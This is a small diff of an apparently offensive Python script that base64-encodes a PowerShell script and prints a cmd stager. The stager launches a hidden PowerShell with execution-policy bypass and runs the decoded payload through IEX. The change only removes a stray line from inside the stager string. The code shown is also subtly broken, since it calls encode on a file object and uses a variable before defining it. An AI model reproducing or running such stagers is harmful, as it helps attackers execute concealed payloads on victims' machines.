@@ -12,7 +12,6 @@ def main():
     script_encoded = base64.b64encode(open(res.POWERSHELL_SCRIPT).encode("utf-8")) 
     cmd_stager = f"""
     %comspec% /b /c start /b /min powershell -nop -ep bypass -w hidden -c "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String({script_encoded})))"
-    res = arguments()
     """
     print(cmd_stager)
 
